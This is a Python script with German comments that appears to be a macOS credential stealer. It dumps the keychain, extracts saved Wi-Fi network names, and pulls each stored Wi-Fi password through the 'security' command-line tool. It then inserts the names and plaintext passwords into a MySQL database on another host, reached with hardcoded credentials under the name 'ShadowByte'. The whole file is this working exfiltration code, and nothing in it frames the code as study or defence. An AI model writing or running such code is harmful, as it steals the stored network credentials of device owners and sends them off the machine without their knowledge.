import subprocess
import re
import mysql.connector

# MySQL-Datenbankverbindung herstellen
connection = mysql.connector.connect(
    host="192.168.1.71",
    user="ShadowByte",
    password="ShadowByte",
    database="system_info_db"
)

# Funktion, um nur WLAN-SSIDs aus dem Schlüsselbund zu extrahieren
def get_wifi_info():
    # Abrufen aller Einträge im Schlüsselbund
    command = ["security", "dump-keychain"]
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout
        print(f"Ergebnisse von 'security dump-keychain':\n{output}")
    except Exception as e:
        print(f"Fehler beim Ausführen des Befehls: {e}")
        return []

    # Nur SSIDs extrahieren, die AirPort/WLAN-Netzwerke sind
    ssids = re.findall(r"\"acct\"<blob>=\"(.*?)\"", output)
    wifi_data = []

    for ssid in ssids:
        if "WLAN" in ssid or "wifi" in ssid.lower() or "SSID" in ssid:
            # Passwort für die SSID abrufen
            command = ["security", "find-generic-password", "-D", "AirPort network password", "-s", ssid, "-g"]
            try:
                password_result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                password_output = password_result.stderr
                password_match = re.search(r"password: \"(.*?)\"", password_output)
                password = password_match.group(1) if password_match else None
                print(f"Passwort für '{ssid}' gefunden: {password}")
            except Exception as e:
                print(f"Fehler beim Abrufen des Passworts für {ssid}: {e}")
                password = None

            wifi_data.append((ssid, password))
    
    return wifi_data

# Funktion zum Speichern der WLAN-Informationen in der Datenbank
def store_wifi_info(wifi_data):
    cursor = connection.cursor()

    # SQL-Anweisung zum Einfügen der WLAN-Daten
    query = "INSERT INTO wifi_info (ssid, password) VALUES (%s, %s)"
    
    # WLAN-Daten in die Datenbank einfügen
    for ssid, password in wifi_data:
        try:
            print(f"Einfügen: SSID = {ssid}, Passwort = {password}")
            cursor.execute(query, (ssid, password))
        except mysql.connector.Error as err:
            print(f"Fehler beim Einfügen in die Datenbank: {err}")
    
    # Änderungen speichern
    connection.commit()
    cursor.close()

# WLAN-Daten abrufen
wifi_info = get_wifi_info()

if wifi_info:
    # WLAN-Daten in die Datenbank speichern
    store_wifi_info(wifi_info)
    print("WLAN-Daten erfolgreich an die Datenbank gesendet.")
else:
    print("Keine WLAN-Daten gefunden.")

# Datenbankverbindung schließen
connection.close()
